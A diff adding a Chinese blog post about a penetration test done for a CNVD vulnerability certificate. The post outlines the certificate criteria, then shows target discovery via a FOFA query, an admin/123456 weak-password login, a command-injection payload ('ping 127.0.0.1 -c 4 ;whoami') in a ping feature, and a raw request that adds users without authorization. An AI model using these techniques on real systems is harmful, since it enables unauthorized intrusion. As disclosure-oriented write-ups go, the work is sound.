@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>记一次cnvd渗透</title>
+      <link href="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/"/>
+      <url>/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<p>前言：挖src挖郁闷了，闲来无事选择挖一个cnvd来练练手，本次的漏洞都没啥难度</p><p>说一下cnvd证书的下放标准</p><p>对于中危及中危以上通用型漏洞（CVSS2.0基准评分超过4.0分），以及涉及党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞(后续对事件型漏洞证明颁发标准将参考中央网信办颁布的关键基础设施相关定义和分类)，CNVD将给予原创漏洞证明（即CNVD漏洞证书，电子版），该证明可通过编号在CNVD官方网站进行查询跟踪。时限要求：按周对上一周归档漏洞且满足证书颁发条件的进行批量制作。</p><p>事件型：高危 重要机构<br>通用型：中危及以上（评分4.0） 注册资金5000w以上，黑盒的测试案例10或以上（3复现+7其他案例，其他案例不要求复现），白盒的得有源码以及提供漏洞处代码调试过程，包含截图和原因。</p><p>过程：</p><p>fofa寻找目标</p><p>app&#x3D;”xx目标系统”</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552039297.png" alt="1717552039297"></p><p>admin ,123456 成功登录管理员用户（弱口令yyds）</p><p>RCE</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552211132.png" alt="1717552211132"></p><p>发现这里有一个ping 的功能，我想这里应该会存在rce漏洞</p><p>ping 127.0.0.1 -c 4 ;whoami （成功rce）</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552367582.png" alt="1717552367582"></p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552712988.png" alt="1717552712988"></p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553182331.png" alt="1717553182331"></p><p>越权</p><p>&#96;POST xxxxxxxxx        HTTP&#x2F;1.1<br>Host: xxxxx<br>Content-Length: 180<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;125.0.0.0 Safari&#x2F;537.36<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Origin: xxxxxxxxxxxxxxxxxxxx<br>Referer: xxxxxxxxxxxxxxxx<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close</p><p>{“jsonrpc”:”2.0”,”method”:”call”,”params”:[“635F7A20A38A4072899C14B3535CFBF5”,”admin”,”sessionAddUser”,{“username”:”123456”,”password”:”554e36b4db2bc61b606ca16e756b1f7d”}],”id”:11}&#96;</p><p>这里将admin，换成任意用户即可添加成功</p><p><img src="/2024/06/05/%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553127082.png" alt="1717553127082"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透实例 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CNVD </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>小程序抓包详细教程</title>
       <link href="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/"/>
       <url>/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
